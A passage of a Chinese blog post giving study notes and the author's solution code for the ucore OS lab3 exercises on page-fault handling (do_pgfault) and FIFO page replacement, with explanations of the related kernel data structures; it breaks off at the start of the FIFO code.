pmm_manager。pmm.c包含了对此物理内存分配类框架的访问，以及与建立、修改、访问页表相关的各种函数实现。在本实验中会用到kmalloc/kfree等函数。</li><li>libs/list.h：定义了通用双向链表结构以及相关的查找、插入等基本操作，这是建立基于链表方法的物理内存管理（以及其他内核功能）的基础。在lab0文档中有相关描述。其他有类似双向链表需求的内核功能模块可直接使用list.h中定义的函数。在本实验中会多次用到插入，删除等操作函数。</li><li>kern/driver/ide.[ch]：定义和实现了内存页swap机制所需的磁盘扇区的读写操作支持；在本实验中会涉及通过swapfs_*函数间接使用文件中的函数。故了解即可。</li><li>kern/fs/*：定义和实现了内存页swap机制所需从磁盘读数据到内存页和写内存数据到磁盘上去的函数 swapfs_read/swapfs_write。在本实验中会涉及使用这两个函数。</li><li>kern/mm/memlayout.h：修改了struct Page，增加了两项pra_*成员结构，其中pra_page_link可以用来建立描述各个页访问情况（比如根据访问先后）的链表。在本实验中会涉及使用这两个成员结构，以及le2page等宏。</li><li>kern/mm/vmm.[ch]：vmm.h描述了mm_struct，vma_struct等表述可访问的虚存地址访问的一些信息，下面会进一步详细讲解。vmm.c涉及mm,vma结构数据的创建/销毁/查找/插入等函数，这些函数在check_vma、check_vmm等中被使用，理解即可。而page fault处理相关的do_pgfault函数是本次实验需要涉及完成的。</li><li>kern/mm/swap.[ch]：定义了实现页替换算法类框架struct swap_manager。swap.c包含了对此页替换算法类框架的初始化、页换入/换出等各种函数实现。重点是要理解何时调用swap_out和swap_in函数。和如何在此框架下连接具体的页替换算法实现。check_swap函数以及被此函数调用的_fifo_check_swap函数完成了对本次实验中的练习2：FIFO页替换算法基本正确性的检查，可了解，便于知道为何产生错误。</li><li>kern/mm/swap_fifo.[ch]：FIFO页替换算法的基于页替换算法类框架struct swap_manager的简化实现，主要被swap.c的相关函数调用。重点是_fifo_map_swappable函数（可用于建立页访问属性和关系，比如访问时间的先后顺序）和_fifo_swap_out_victim函数（可用于实现挑选出要换出的页），当然换出哪个页需要借助于fifo_map_swappable函数建立的某种属性关系，已选出合适的页。</li><li>kern/mm/mmu.h：其中定义了页表项的各种属性位，比如PTE_P\PET_D\PET_A等，对于实现扩展实验的clock算法会有帮助。</li></ul><p>本次实验的主要练习集中在vmm.c中的do_pgfault函数和swap_fifo.c中的_fifo_map_swappable函数、_fifo_swap_out_victim函数。</p><h3 id="1-实验执行流程概述"><a href="#1-实验执行流程概述" class="headerlink" title="1.实验执行流程概述"></a>1.实验执行流程概述</h3><p>首先是初始化过程。参考ucore总控函数init的代码，可以看到在调用完成虚拟内存初始化的vmm_init函数之前，需要首先调用pmm_init函数完成物理内存的管理，这也是我们lab2已经完成的内容。接着是执行中断和异常相关的初始化工作，即调用pic_init函数和idt_init函数等，这些工作与lab1的中断异常初始化工作的内容是相同的。</p><p>在调用完idt_init函数之后，将进一步调用三个lab3中才有的新函数vmm_init、ide_init和swap_init。这三个函数涉及了本次实验中的两个练习。第一个函数vmm_init是检查我们的练习1是否正确实现了。为了表述不在物理内存中的“合法”虚拟页，需要有数据结构来描述这样的页，为此ucore建立了mm_struct和vma_struct数据结构（接下来的小节中有进一步详细描述），假定我们已经描述好了这样的“合法”虚拟页，当ucore访问这些“合法”虚拟页时，会由于没有虚实地址映射而产生页访问异常。如果我们正确实现了练习1，则do_pgfault函数会申请一个空闲物理页，并建立好虚实映射关系，从而使得这样的“合法”虚拟页有实际的物理页帧对应。这样练习1就算完成了。</p><p>ide_init和swap_init是为练习2准备的。由于页面置换算法的实现存在对硬盘数据块的读写，所以ide_init就是完成对用于页换入换出的硬盘（简称swap硬盘）的初始化工作。完成ide_init函数后，ucore就可以对这个swap硬盘进行读写操作了。swap_init函数首先建立swap_manager，swap_manager是完成页面替换过程的主要功能模块，其中包含了页面置换算法的实现（具体内容可参考5小节）。然后会进一步调用执行check_swap函数在内核中分配一些页，模拟对这些页的访问，这会产生页访问异常。如果我们正确实现了练习2，就可通过do_pgfault来调用swap_map_swappable函数来查询这些页的访问情况并间接调用实现页面置换算法的相关函数，把“不常用”的页换出到磁盘上。</p><h3 id="2-置换算法"><a href="#2-置换算法" class="headerlink" title="2.置换算法"></a>2.置换算法</h3><p>操作系统迟早会碰到没有内存空闲空间而必须要置换出内存中某个“不常用”的页的情况。如何判断内存中哪些是“常用”的页，哪些是“不常用”的页，把“常用”的页保持在内存中，在物理内存空闲空间不够的情况下，把“不常用”的页置换到硬盘上就是页替换算法着重考虑的问题。容易理解，一个好的页替换算法会导致页访问异常次数少，也就意味着访问硬盘的次数也少，从而使得应用程序执行的效率就高。本次实验涉及的页替换算法（包括扩展练习）：</p><ul><li>先进先出(First In First Out, FIFO)页替换算法：该算法总是淘汰最先进入内存的页，即选择在内存中驻留时间最久的页予以淘汰。只需把一个应用程序在执行过程中已调入内存的页按先后次序链接成一个队列，队列头指向内存中驻留时间最久的页，队列尾指向最近被调入内存的页。这样需要淘汰页时，从队列头很容易查找到需要淘汰的页。FIFO算法只是在应用程序按线性顺序访问地址空间时效果才好，否则效率不高。因为那些常被访问的页，往往在内存中也停留得最久，结果它们因变“老”而不得不被置换出去。FIFO算法的另一个缺点是，它有一种异常现象（Belady现象），即在增加放置页的页帧的情况下，反而使页访问异常次数增多。</li><li>时钟（Clock）页替换算法：是LRU算法的一种近似实现。时钟页替换算法把各个页面组织成环形链表的形式，类似于一个钟的表面。然后把一个指针（简称当前指针）指向最老的那个页面，即最先进来的那个页面。另外，时钟算法需要在页表项（PTE）中设置了一位访问位来表示此页表项对应的页当前是否被访问过。当该页被访问时，CPU中的MMU硬件将把访问位置“1”。当操作系统需要淘汰页时，对当前指针指向的页所对应的页表项进行查询，如果访问位为“0”，则淘汰该页，如果该页被写过，则还要把它换出到硬盘上；如果访问位为“1”，则将该页表项的此位置“0”，继续访问下一个页。该算法近似地体现了LRU的思想，且易于实现，开销少，需要硬件支持来设置访问位。时钟页替换算法在本质上与FIFO算法是类似的，不同之处是在时钟页替换算法中跳过了访问位为1的页。</li><li>改进的时钟（Enhanced Clock）页替换算法：在时钟置换算法中，淘汰一个页面时只考虑了页面是否被访问过，但在实际情况中，还应考虑被淘汰的页面是否被修改过。因为<strong>淘汰修改过的页面还需要写回硬盘(迷惑, 移到swap分区跟是否修改过有什么关系)<strong>，使得其置换代价大于未修改过的页面，所以优先淘汰没有修改的页，减少磁盘操作次数。改进的时钟置换算法除了考虑页面的访问情况，还需考虑页面的修改情况。即该算法不但希望淘汰的页面是最近未使用的页，而且还希望被淘汰的页是在主存驻留期间其页面内容未被修改过的。这需要为每一页的对应页表项内容中增加一位引用位和一位修改位。当该页被访问时，CPU中的MMU硬件将把访问位置“1”。当该页被“写”时，CPU中的MMU硬件将把修改位置“1”。这样这两位就存在四种可能的组合情况：（0，0）表示最近未被引用也未被修改，首先选择此页淘汰；（0，1）最近未被使用，但被修改，其次选择；（1，0）最近使用而未修改，再次选择；（1，1）最近使用且修改，最后选择。该算法与时钟算法相比，可进一步减少磁盘的I/O操作次数，但为了查找到一个尽可能适合淘汰的页面，</strong>可能需要经过多次扫描，增加了算法本身的执行开销</strong>。</li></ul><h3 id="3-相关数据结构"><a href="#3-相关数据结构" class="headerlink" title="3.相关数据结构"></a>3.相关数据结构</h3><blockquote><p>Typoar给我整了个崩溃, 我也崩溃了⊙▃⊙以下内容直至challenge前复制于<a href="https://kiprey.github.io/2020/08/uCore-3/#3-uCore%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E7%9A%84%E5%AE%9E%E7%8E%B0">这里</a> </p></blockquote><h4 id="I-虚拟内存管理"><a href="#I-虚拟内存管理" class="headerlink" title="I. 虚拟内存管理"></a>I. 虚拟内存管理</h4><ul><li><p>结构体变量<code>check_mm_struct</code>用于管理虚拟内存页面，其结构体如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// the control struct for a set of vma using the same PDT</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br>    <span class="hljs-keyword">list_entry_t</span> mmap_list;        <span class="hljs-comment">// 按照虚拟地址顺序双向连接的虚拟页链表</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> *<span class="hljs-title">mmap_cache</span>;</span> <span class="hljs-comment">// 当前使用的虚拟页地址，该成员加速页索引速度。</span><br>    <span class="hljs-keyword">pde_t</span> *pgdir;                  <span class="hljs-comment">// 虚拟页对应的PDT</span><br>    <span class="hljs-keyword">int</span> map_count;                 <span class="hljs-comment">// 虚拟页个数</span><br>    <span class="hljs-keyword">void</span> *sm_priv;                 <span class="hljs-comment">// 用于指向swap manager的某个链表,在FIFO算法中，该双向链表用于将可交换的已分配物理页串起来</span><br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>当分配出新的虚拟页时，程序会执行<code>insert_vma_struct</code>函数，此时虚拟页<code>vma_struct</code>就会被插入<code>mm_struct::mmap_list</code>双向链表中。</p></li><li><p>若程序首次访问该内存而触发缺页中断时，程序会在缺页处理程序中为该虚拟页划分出一块新的物理页。同时，还会更新<code>mm_struct::pgdir</code>上的对应页表条目，之后该页的内存访问即可正常执行。</p></li><li><p>在FIFO页面置换算法中，初始时，<code>mm_struct</code>中的<code>sm_priv</code>会被设置为<code>pra_list_head</code>。而<code>pra_list_head</code>是一个双向链表的起始结点，该双向链表用于将<strong>可交换的已分配物理页</strong>串起来。</p></li></ul><h4 id="II-页面置换"><a href="#II-页面置换" class="headerlink" title="II. 页面置换"></a>II. 页面置换</h4><ul><li><p><code>swap_manager</code>与<code>pmm_manager</code>类似，都设置了一个用于管理某个功能的模块。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">swap_manager</span></span><br><span class="hljs-class">&#123;</span><br>     <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>     <span class="hljs-comment">/* Global initialization for the swap manager */</span><br>     <span class="hljs-keyword">int</span> (*init)            (<span class="hljs-keyword">void</span>);<br>     <span class="hljs-comment">/* Initialize the priv data inside mm_struct */</span><br>     <span class="hljs-keyword">int</span> (*init_mm)         (struct mm_struct *mm);<br>     <span class="hljs-comment">/* Called when tick interrupt occured */</span><br>     <span class="hljs-keyword">int</span> (*tick_event)      (struct mm_struct *mm);<br>     <span class="hljs-comment">/* Called when map a swappable page into the mm_struct */</span><br>     <span class="hljs-keyword">int</span> (*map_swappable)   (struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr, struct Page *page, <span class="hljs-keyword">int</span> swap_in);<br>     <span class="hljs-comment">/* When a page is marked as shared, this routine is called to</span><br><span class="hljs-comment">      * delete the addr entry from the swap manager */</span><br>     <span class="hljs-keyword">int</span> (*set_unswappable) (struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr);<br>     <span class="hljs-comment">/* Try to swap out a page, return then victim */</span><br>     <span class="hljs-keyword">int</span> (*swap_out_victim) (struct mm_struct *mm, struct Page **ptr_page, <span class="hljs-keyword">int</span> in_tick);<br>     <span class="hljs-comment">/* check the page relpacement algorithm */</span><br>     <span class="hljs-keyword">int</span> (*check_swap)(<span class="hljs-keyword">void</span>);<br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>若使用FIFO页面置换算法，则在缺页中断程序中，程序只会<strong>换入</strong>目标物理页，而不会主动换出。</p><p>只有在分配空闲物理页时，若<code>pmm_manager-&gt;alloc_pages(n)</code>失败，则程序才会执行一次页面换出，以腾出空闲的物理页，并重新分配。</p></li><li><p><code>swap_in</code>函数只会将目标物理页加载进内存中，而不会修改页表条目。所以相关的标志位设置必须在<code>swap_in</code>函数的外部手动处理。而<code>swap_out</code>函数会先执行<code>swap_out_victim</code>，找出最适合换出的物理页，并将其换出，最后刷新TLB, <strong>有可能换出多页</strong>。需要注意的是<code>swap_out</code>函数会在函数内部设置PTE，当某个页面被换出后，PTE会被设置为所换出物理页在硬盘上的偏移, 而且会执行<strong>free_page</strong>, 往空闲链表里面加入该page</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cprintf(<span class="hljs-string">&quot;swap_out: i %d, store page in vaddr 0x%x to disk swap entry %d\n&quot;</span>, i, v, page-&gt;pra_vaddr/PGSIZE+<span class="hljs-number">1</span>);<br>*ptep = (page-&gt;pra_vaddr/PGSIZE+<span class="hljs-number">1</span>)&lt;&lt;<span class="hljs-number">8</span>;<br>free_page(page);<br></code></pre></div></td></tr></table></figure><p>当PTE所对应的物理页存在于内存中，那么该PTE就是正常的页表条目，可被CPU直接寻址用于转换地址。但当所对应的物理页不在内存时，该PTE就成为<code>swap_entry_t</code>，保存该物理页数据在外存的偏移位置。相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * swap_entry_t</span><br><span class="hljs-comment"> * --------------------------------------------</span><br><span class="hljs-comment"> * |         offset        |   reserved   | 0 |</span><br><span class="hljs-comment"> * --------------------------------------------</span><br><span class="hljs-comment"> *           24 bits            7 bits    1 bit</span><br><span class="hljs-comment"> * /</span><br><span class="hljs-comment"> /* *</span><br><span class="hljs-comment"> * swap_offset - takes a swap_entry (saved in pte), and returns</span><br><span class="hljs-comment"> * the corresponding offset in swap mem_map.</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> swap_offset(entry) (&#123;                                       \</span><br><span class="hljs-meta">               size_t __offset = (entry &gt;&gt; 8);                        \</span><br><span class="hljs-meta">               <span class="hljs-meta-keyword">if</span> (!(__offset &gt; 0 &amp;&amp; __offset &lt; max_swap_offset)) &#123;    \</span><br><span class="hljs-meta">                    panic(<span class="hljs-meta-string">&quot;invalid swap_entry_t = %08x.\n&quot;</span>, entry);    \</span><br><span class="hljs-meta">               &#125;                                                    \</span><br><span class="hljs-meta">               __offset;                                            \</span><br><span class="hljs-meta">          &#125;)</span><br></code></pre></div></td></tr></table></figure></li><li><p>同时，不是所有物理页面都可以置换，例如内核关键代码和数据等等，所以在分配物理页时，需要对于那些可被置换的物理页执行<code>swap_map_swappable</code>函数，将该物理页加入到<code>mm_struct::sm_priv</code>指针所指向的双向链表中，换入和换出操作都会操作该链表（插入/移除<strong>可交换的已分配</strong>物理页）。</p></li><li><p>数据结构<code>Page</code>和<code>vma_struct</code>分别用于管理物理页和虚拟页，其结构如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 用于描述某个虚拟页的结构</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">vm_mm</span>;</span> <span class="hljs-comment">// 管理该虚拟页的mm_struct</span><br>    <span class="hljs-keyword">uintptr_t</span> vm_start;      <span class="hljs-comment">// 虚拟页起始地址，包括当前地址  </span><br>    <span class="hljs-keyword">uintptr_t</span> vm_end;        <span class="hljs-comment">// 虚拟页终止地址，不包括当前地址（地址前闭后开）  </span><br>    <span class="hljs-keyword">uint32_t</span> vm_flags;       <span class="hljs-comment">// 相关标志位</span><br>    <span class="hljs-keyword">list_entry_t</span> list_link;  <span class="hljs-comment">// 用于连接各个虚拟页的双向指针</span><br>&#125;;<br><br><span class="hljs-comment">// 数据结构Page相关成员的用途已在uCore-2中介绍过，这里只提它新增的两个成员pra_*</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> &#123;</span><br>    <span class="hljs-keyword">int</span> ref;<br>    <span class="hljs-keyword">uint32_t</span> flags;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> property;<br>    <span class="hljs-keyword">list_entry_t</span> page_link;<br>    <span class="hljs-keyword">list_entry_t</span> pra_page_link;     <span class="hljs-comment">// 用于连接上一个和下一个*可交换已分配*的物理页</span><br>    <span class="hljs-keyword">uintptr_t</span> pra_vaddr;            <span class="hljs-comment">// 用于保存该物理页所对应的虚拟地址。</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>当分配某个虚拟页<code>vma_struct</code>时，程序会在<code>insert_vma_struct</code>函数中设置其<code>vm_mm</code>成员为某个<code>mm_struct</code>，这样便于后续的管理。</li><li>在函数<code>pgdir_alloc_page</code>中，程序会设置<code>Page</code>的<code>pra_vaddr</code>成员，将其设置为当前物理页所对应的虚拟地址，之后便可通过<code>Page-&gt;pra_vaddr-&gt;pte</code>一条链，直接找到当前<strong>物理页</strong>地址所对应的PTE条目。同时，也可通过<code>pra_vaddr</code>来确定对应外存的相对偏移<code>page-&gt;pra_vaddr/PGSIZE+1</code>。</li><li><code>Page::page_link</code>用于将空闲物理页连接至双向链表中，而<code>page::pra_page_link</code>用于将<strong>可交换的已分配</strong>物理页连接至另一个双向链表中，注意两者的用途是不同的。</li></ul></li></ul><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="练习0"><a href="#练习0" class="headerlink" title="练习0"></a>练习0</h3><blockquote><p><strong>填写已有实验</strong> </p></blockquote><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p><strong>给未被映射的地址映射上物理页</strong></p><p>完成do_pgfault（mm/vmm.c）函数，给未被映射的地址映射上物理页。设置访问权限 的时候需要参考页面所在 VMA 的权限，同时需要注意映射物理页时需要操作内存控制 结构所指定的页表，而不是内核的页表。</p></blockquote><p>实验代码如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_pgfault</span><span class="hljs-params">(struct mm_struct *mm, <span class="hljs-keyword">uint32_t</span> error_code, <span class="hljs-keyword">uintptr_t</span> addr)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = -E_INVAL;<br>    <span class="hljs-comment">// 获取触发pgfault的虚拟地址所在虚拟页</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> *<span class="hljs-title">vma</span> =</span> find_vma(mm, addr);<br><br>    pgfault_num++;<br>    <span class="hljs-comment">// 如果当前访问的虚拟地址不在已经分配的虚拟页中</span><br>    <span class="hljs-keyword">if</span> (vma == <span class="hljs-literal">NULL</span> || vma-&gt;vm_start &gt; addr) &#123;\<br>        cprintf(<span class="hljs-string">&quot;not valid addr %x, and  can not find it in vma\n&quot;</span>, addr);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// 检测错误代码。这里的检测不涉及特权判断。</span><br>    <span class="hljs-keyword">switch</span> (error_code &amp; <span class="hljs-number">3</span>) &#123;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-comment">// 写，同时存在物理页，则写时复制</span><br>        <span class="hljs-comment">// 需要注意的是，default会执行case2的代码，也就是判断是否有写权限。</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-comment">// 同时如果当前操作是写入，但所在虚拟页不允许写入</span><br>        <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE)) &#123;<br>            cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = write AND not present, but the addr&#x27;s vma cannot write\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">/* error code flag : (W/R=0, P=1): read, present */</span><br>        <span class="hljs-comment">// 读，同时存在物理页。那就不可能会调用page fault，肯定哪里有问题，直接failed</span><br>        cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = read AND present\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-comment">/* error code flag : (W/R=0, P=0): read, not present */</span><br>        <span class="hljs-comment">// 如果当前操作是读取，但所在虚拟页不允许读取或执行</span><br>        <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) &#123;<br>            cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = read AND not present, but the addr&#x27;s vma cannot read or exec\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 设置页表条目所对应的权限</span><br>    <span class="hljs-keyword">uint32_t</span> perm = PTE_U;<br>    <span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE) &#123;<br>        perm |= PTE_W;<br>    &#125;<br>    addr = ROUNDDOWN(addr, PGSIZE);<br>    ret = -E_NO_MEM;<br>    <span class="hljs-keyword">pte_t</span> *ptep=<span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">/* LAB3 EXERCISE 1: YOUR CODE */</span><br>    <span class="hljs-comment">// 查找当前虚拟地址所对应的页表项</span><br>    <span class="hljs-keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>        cprintf(<span class="hljs-string">&quot;get_pte in do_pgfault failed\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// 如果这个页表项所对应的物理页不存在，则</span><br>    <span class="hljs-keyword">if</span> (*ptep == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 分配一块物理页，并设置页表项</span><br>        <span class="hljs-keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="hljs-literal">NULL</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* LAB3 EXERCISE 2: YOUR CODE */</span><br>        <span class="hljs-comment">// 如果这个页表项所对应的物理页存在，但不在内存中</span><br>        <span class="hljs-comment">// 如果swap已经初始化完成</span><br>        <span class="hljs-keyword">if</span>(swap_init_ok) &#123;<br>            struct Page *page=<span class="hljs-literal">NULL</span>;<br>            <span class="hljs-comment">// 将目标数据加载到某块新的物理页中。</span><br>            <span class="hljs-comment">// 该物理页可能是尚未分配的物理页，也可能是从别的已分配物理页中取的</span><br>            <span class="hljs-keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="hljs-number">0</span>) &#123;<br>                cprintf(<span class="hljs-string">&quot;swap_in in do_pgfault failed\n&quot;</span>);<br>                <span class="hljs-keyword">goto</span> failed;<br>            &#125;<br>            <span class="hljs-comment">// 将该物理页与对应的虚拟地址关联，同时设置页表。</span><br>            page_insert(mm-&gt;pgdir, page, addr, perm);<br>            <span class="hljs-comment">// 当前缺失的页已经加载回内存中，所以设置当前页为可swap。</span><br>            swap_map_swappable(mm, addr, page, <span class="hljs-number">1</span>);<br>            page-&gt;pra_vaddr = addr;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            cprintf(<span class="hljs-string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>   &#125;<br>   ret = <span class="hljs-number">0</span>;<br>failed:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>关于<code>get_pte() and page_remove_pte() vs. page_inseret()</code>回顾: <ul><li>get pte and return the kernel virtual address of this pte for la, and if the PT contianing this pte didn’t exist, alloc a page for PT</li><li>page的插入和删除意味着page结构的ref增减以及pte的存在与否, 而实验为了弄出一个练习, 在<code>page_remove()</code>中判断pte不为空后调用<code>page_remove_pte()</code>, ref_dec and clear pte.</li></ul></li></ul><hr><ul><li>请描述页目录项（Page Directory Entry）和页表项（Page Table Entry）中组成部分对ucore实现页替换算法的潜在用处。<ul><li>即PTE结构与其标志位用途</li></ul></li><li>如果ucore的缺页服务例程在执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？<ul><li>将发生错误的线性地址（虚拟地址）保存至CR2寄存器中。</li><li>压入<code>EFLAGS</code>，<code>CS</code>, <code>EIP</code>，错误码和中断号至当前内核栈中。</li><li>保存上下文。</li><li>执行新的缺页中断程序。</li><li>恢复上下文。</li><li>继续执行<strong>上一级</strong>的缺页服务例程。</li></ul></li></ul><h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p><strong>补充完成基于FIFO的页面替换算法</strong></p><p>完成vmm.c中的do_pgfault函数，并且在实现FIFO算法的swap_fifo.c中完成map_swappable和swap_out_victim函数。</p></blockquote><ul><li><p><code>FIFO</code>中，当新加入一个物理页时，我们只需将该物理页加入至链表首部即可。当需要换出某个物理页时，选择链表末尾的物理页即可。</p></li><li><p>相关实现如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code 